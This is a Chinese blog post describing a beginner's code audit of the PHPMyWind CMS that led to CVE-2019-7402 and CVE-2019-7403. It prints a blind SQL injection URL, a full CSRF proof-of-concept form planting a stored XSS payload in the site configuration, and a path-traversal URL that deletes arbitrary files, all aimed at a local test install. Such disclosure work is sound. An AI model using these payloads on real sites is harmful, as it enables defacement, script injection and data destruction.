很水嘚 很水嘚 师傅们请绕道～～(已经被novy吐槽过了233)
正式学习代码审计一周，总算有点小收获了呢，好开森
CVE-2019-7402 CVE-2019-7403
打算写篇文章纪念一下，文章水平有限，还请师傅们多多指教～
学习代码审计这一周，首先花了一天时间复习了下php(php基础辣鸡嘚很233)，用一天时间看了dvwa的源码，然后一天多时间大概看了下bluecms，然后找到了phpmywind这个cms，没有框架又很小，还蛮适合初学者的。
下载源码就扔到Seay里面了，一堆注入

![图片](https://uploader.shimo.im/f/3PSZCCO8IFcAocrl.png!thumbnail)

先随便点开一个跟一下 发现每个参数的初始化都是在/include/common.inc.php里面，都会加上addslashes转义。

![图片](https://uploader.shimo.im/f/FlxaKxVCiY0XHG2g.png!thumbnail)

又没有宽字节或者其它的编码，基本上杜绝了非整型的注入，然后再看看int型的注入，在所有的前台查询中，都做了类型转换...

![图片](https://uploader.shimo.im/f/Av3OSVUZBcYike0U.png!thumbnail)

但是在所有后台查询int型参数没有做类型转换,但是所有的sql查询斗调用了Mysql类,里面自定义了CheckSql() 方法，主要是过滤了select sleep load_file into file等关键字，基于黑名单，总是可以绕过的，从网上搜了一下，构造出这样一个payload
>http://127.0.0.1/phpmywind/admin/admanage.php?tid=2-(if(53=(if(substr((rpad(version(),1,1)),1,1)=char(61),1,0)),1,0)) 

rpad函数返回很多行，需要group_concat函数进行处理，group_concat被过滤了，到此，我放弃尝试了233
然后继续去读源码，在footer.php文件中发现了GetQQ() 这个函数，跟进去看，没有做一点过滤

![图片](https://uploader.shimo.im/f/ZaRJ4uXjvPYjx0Wz.png!thumbnail)

但是这个参数的修改是需要后台管理员，但是整个cms没有做csrf的防护，构建个csrf的poc
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1/phpmywind/admin/web_config.php" method="POST">
      <input type="hidden" name="cfg&#95;webname" value="�&#136;&#145;�&#154;&#132;�&#189;&#145;�&#171;&#153;" />
      <input type="hidden" name="cfg&#95;weburl" value="http&#58;&#47;&#47;127&#46;0&#46;0&#46;1" />
      <input type="hidden" name="cfg&#95;webpath" value="&#47;phpmywind" />
      <input type="hidden" name="cfg&#95;author" value="" />
      <input type="hidden" name="cfg&#95;generator" value="PHPMyWind&#32;CMS" />
      <input type="hidden" name="cfg&#95;seotitle" value="" />
      <input type="hidden" name="cfg&#95;keyword" value="" />
      <input type="hidden" name="cfg&#95;description" value="" />
      <input type="hidden" name="cfg&#95;copyright" value="Copyright&#32;�&#169;&#32;2015&#32;&#45;&#32;2018&#32;phpMyWind&#46;com&#32;All&#32;Rights&#32;Reserved" />
      <input type="hidden" name="cfg&#95;hotline" value="400&#45;800&#45;8888" />
      <input type="hidden" name="cfg&#95;icp" value="" />
      <input type="hidden" name="cfg&#95;webswitch" value="Y" />
      <input type="hidden" name="cfg&#95;switchshow" value="�&#175;&#185;�&#184;&#141;�&#183;�&#188;&#140;�&#189;&#145;�&#171;&#153;�&#187;&#180;�&#138;&#164;�&#188;&#140;�&#175;&#183;�&#168;&#141;�&#144;&#142;�&#153;&#187;�&#189;&#149;�&#128;&#130;&lt;br&#32;&#47;&gt;�&#189;&#145;�&#171;&#153;�&#187;&#180;�&#138;&#164;�&#156;&#159;�&#151;&#180;�&#175;&#185;�&#130;&#168;�&#128;&#160;�&#136;&#144;�&#154;&#132;�&#184;&#141;�&#190;&#191;�&#188;&#140;�&#175;&#183;�&#176;&#133;�&#167;&#163;�&#188;&#129;" />
      <input type="hidden" name="action" value="update" />
      <input type="hidden" name="cfg&#95;upload&#95;img&#95;type" value="gif&#124;png&#124;jpg&#124;bmp" />
      <input type="hidden" name="cfg&#95;upload&#95;soft&#95;type" value="zip&#124;gz&#124;rar&#124;iso&#124;doc&#124;xls&#124;ppt&#124;wps&#124;txt" />
      <input type="hidden" name="cfg&#95;upload&#95;media&#95;type" value="swf&#124;flv&#124;mpg&#124;mp3&#124;rm&#124;rmvb&#124;wmv&#124;wma&#124;wav" />
      <input type="hidden" name="cfg&#95;max&#95;file&#95;size" value="2097152" />
      <input type="hidden" name="cfg&#95;imgresize" value="Y" />
      <input type="hidden" name="cfg&#95;countcode" value="" />
      <input type="hidden" name="cfg&#95;qqcode" value="&quot;&gt;&lt;img&#32;src&#61;1&#32;onerror&#61;alert&#40;1&#41;&gt;&lt;img&#32;src&#61;&quot;aaa" />
      <input type="hidden" name="action" value="update" />
      <input type="hidden" name="cfg&#95;mysql&#95;type" value="mysqli" />
      <input type="hidden" name="cfg&#95;pagenum" value="20" />
      <input type="hidden" name="cfg&#95;timezone" value="8" />
      <input type="hidden" name="cfg&#95;mobile" value="Y" />
      <input type="hidden" name="cfg&#95;member" value="Y" />
      <input type="hidden" name="cfg&#95;oauth" value="Y" />
      <input type="hidden" name="cfg&#95;comment" value="Y" />
      <input type="hidden" name="cfg&#95;maintype" value="N" />
      <input type="hidden" name="cfg&#95;typefold" value="N" />
      <input type="hidden" name="cfg&#95;quicktool" value="Y" />
      <input type="hidden" name="cfg&#95;diserror" value="Y" />
      <input type="hidden" name="action" value="update" />
      <input type="hidden" name="cfg&#95;isreurl" value="N" />
      <input type="hidden" name="cfg&#95;reurl&#95;index" value="index&#46;html" />
      <input type="hidden" name="cfg&#95;reurl&#95;about" value="&#123;about&#125;&#45;&#123;cid&#125;&#45;&#123;page&#125;&#46;html" />
      <input type="hidden" name="cfg&#95;reurl&#95;news" value="&#123;news&#125;&#45;&#123;cid&#125;&#45;&#123;page&#125;&#46;html" />
      <input type="hidden" name="cfg&#95;reurl&#95;newsshow" value="&#123;newsshow&#125;&#45;&#123;cid&#125;&#45;&#123;id&#125;&#45;&#123;page&#125;&#46;html" />
      <input type="hidden" name="cfg&#95;reurl&#95;product" value="&#123;product&#125;&#45;&#123;cid&#125;&#45;&#123;page&#125;&#46;html" />
      <input type="hidden" name="cfg&#95;reurl&#95;productshow" value="&#123;productshow&#125;&#45;&#123;cid&#125;&#45;&#123;id&#125;&#45;&#123;page&#125;&#46;html" />
      <input type="hidden" name="cfg&#95;reurl&#95;case" value="&#123;case&#125;&#45;&#123;cid&#125;&#45;&#123;page&#125;&#46;html" />
      <input type="hidden" name="cfg&#95;reurl&#95;caseshow" value="&#123;caseshow&#125;&#45;&#123;cid&#125;&#45;&#123;id&#125;&#45;&#123;page&#125;&#46;html" />
      <input type="hidden" name="cfg&#95;reurl&#95;join" value="&#123;join&#125;&#45;&#123;page&#125;&#46;html" />
      <input type="hidden" name="cfg&#95;reurl&#95;joinshow" value="&#123;joinshow&#125;&#45;&#123;id&#125;&#46;html" />
      <input type="hidden" name="cfg&#95;reurl&#95;message" value="&#123;message&#125;&#45;&#123;page&#125;&#46;html" />
      <input type="hidden" name="cfg&#95;reurl&#95;contact" value="&#123;contact&#125;&#45;&#123;cid&#125;&#45;&#123;page&#125;&#46;html" />
      <input type="hidden" name="cfg&#95;reurl&#95;soft" value="&#123;soft&#125;&#45;&#123;cid&#125;&#45;&#123;page&#125;&#46;html" />
      <input type="hidden" name="cfg&#95;reurl&#95;softshow" value="&#123;softshow&#125;&#45;&#123;cid&#125;&#45;&#123;id&#125;&#45;&#123;page&#125;&#46;html" />
      <input type="hidden" name="cfg&#95;reurl&#95;goods" value="&#123;goods&#125;&#45;&#123;cid&#125;&#45;&#123;tid&#125;&#45;&#123;page&#125;&#46;html" />
      <input type="hidden" name="cfg&#95;reurl&#95;goodsshow" value="&#123;goodsshow&#125;&#45;&#123;cid&#125;&#45;&#123;tid&#125;&#45;&#123;id&#125;&#45;&#123;page&#125;&#46;html" />
      <input type="hidden" name="cfg&#95;reurl&#95;vote" value="&#123;vote&#125;&#45;&#123;id&#125;&#46;html" />
      <input type="hidden" name="cfg&#95;reurl&#95;custom" value="&#123;file&#125;&#46;html" />
      <input type="hidden" name="action" value="update" />
      <input type="hidden" name="cfg&#95;auth&#95;key" value="TzdVWeg0DGP8bRO6" />
      <input type="hidden" name="cfg&#95;alipay&#95;uname" value="" />
      <input type="hidden" name="cfg&#95;alipay&#95;partner" value="" />
      <input type="hidden" name="cfg&#95;alipay&#95;key" value="" />
      <input type="hidden" name="cfg&#95;qq&#95;appid" value="" />
      <input type="hidden" name="cfg&#95;qq&#95;appkey" value="" />
      <input type="hidden" name="cfg&#95;weibo&#95;appid" value="" />
      <input type="hidden" name="cfg&#95;weibo&#95;appkey" value="" />
      <input type="hidden" name="action" value="update" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
一个首页存储型xss就完成啦

![图片](https://uploader.shimo.im/f/dNr7tm7QVm0JfTB2.png!thumbnail)

继续审计，找到了database_backup.php 删除文件操作没有做参数过滤 
![图片](https://uploader.shimo.im/f/yVnXZ8CBJMkt9neF.png!thumbnail)
![图片](https://uploader.shimo.im/f/NdhhTKvv3JcbvMr5.png!thumbnail)![图片](https://uploader.shimo.im/f/mYVA99QL8W8ptvRl.png!thumbnail)
构造url
>http://127.0.0.1:8080/phpmywind/admin/database_backup.php?action=import&dopost=deldir&tbname=../../../../../../../bbb

成功删除C盘文件
![图片](https://uploader.shimo.im/f/pjF5RZicTSwBah80.png!thumbnail)

在最后在/admin/goods_update.php处发现一处后台getshell，问题出在common.func.php String2Array 本来超级高兴的，可是网上一看已经被提交过了2333 附上链接 [https://github.com/panghusec/exploit/issues/4](https://github.com/panghusec/exploit/issues/4)

![图片](https://uploader.shimo.im/f/GeTwwbqOl7gty606.png!thumbnail)

感觉整体审计的也差不多了，这个年过的很有意思(虽说有点宅233) 
新年快乐 keep fighting~
